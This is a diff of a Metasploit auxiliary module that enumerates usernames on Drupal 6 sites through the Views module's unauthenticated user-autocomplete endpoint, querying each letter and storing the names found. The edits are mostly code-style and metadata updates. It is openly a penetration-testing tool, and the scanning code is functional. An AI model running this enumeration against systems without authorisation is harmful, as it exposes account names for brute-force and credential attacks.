@@ -1,67 +1,74 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanServer
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Drupal Views Module Users Enumeration',
-      'Description'    => %q{
-        This module exploits an information disclosure vulnerability in the 'Views'
-        module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'
-      },
-      'Author'         =>
-        [
-          'Justin Klein Keane', #Original Discovery
+    super(
+      update_info(
+        info,
+        'Name' => 'Drupal Views Module Users Enumeration',
+        'Description' => %q{
+          This module exploits an information disclosure vulnerability in the 'Views'
+          module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'.
+          Drupal 6 with 'Views' module <= 6.x-2.11 are vulnerable.  Drupal does not
+          consider disclosure of usernames as a weakness.
+        },
+        'Author' => [
+          'Justin Klein Keane', # Original Discovery
           'Robin Francois <rof[at]navixia.com>',
           'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['URL', 'http://www.madirish.net/node/465'],
+          ['URL', 'https://www.drupal.org/node/1004778'],
         ],
-      'DisclosureDate' => 'Jul 2 2010'
-    ))
+        'DisclosureDate' => '2010-07-02',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [true, "Drupal Path", "/"])
-      ], self.class)
+      ]
+    )
   end
 
   def base_uri
-    @base_uri ||= "#{normalize_uri(target_uri.path)}?q=admin/views/ajax/autocomplete/user/"
+    @base_uri ||= normalize_uri("#{target_uri.path}/?q=admin/views/ajax/autocomplete/user/")
   end
 
   def check_host(ip)
     res = send_request_cgi(
-      'uri'     => base_uri,
-      'method'  => 'GET',
+      'uri' => base_uri,
+      'method' => 'GET',
       'headers' => { 'Connection' => 'Close' }
     )
 
     unless res
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown('No response received from target')
     end
 
     if res.body.include?('Access denied')
       # This probably means the Views Module actually isn't installed
       print_error("Access denied")
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('Drupal Views module does not appear to be installed')
     elsif res.message != 'OK' || res.body != '[  ]'
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('Drupal Views user autocomplete endpoint not accessible')
     else
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears('Drupal Views user enumeration endpoint is accessible')
     end
   end
 
@@ -103,8 +110,8 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("Iterating on letter: #{l}")
 
       res = send_request_cgi(
-        'uri'     => "#{base_uri}#{l}",
-        'method'  => 'GET',
+        'uri' => "#{base_uri}#{l}",
+        'method' => 'GET',
         'headers' => { 'Connection' => 'Close' }
       )
 
@@ -112,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
         begin
           user_list = JSON.parse(res.body)
         rescue JSON::ParserError => e
-          elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+          elog('Exception encountered parsing JSON response', error: e)
           return []
         end
         if user_list.empty?
@@ -126,9 +133,9 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
     end
-
+    results = results.flatten.uniq
     print_status("Done. #{results.length} usernames found...")
-    results.flatten.uniq.each do |user|
+    results.each do |user|
       print_good("Found User: #{user}")
 
       report_cred(
@@ -149,5 +156,4 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_status("Usernames stored in: #{p}")
   end
-
 end
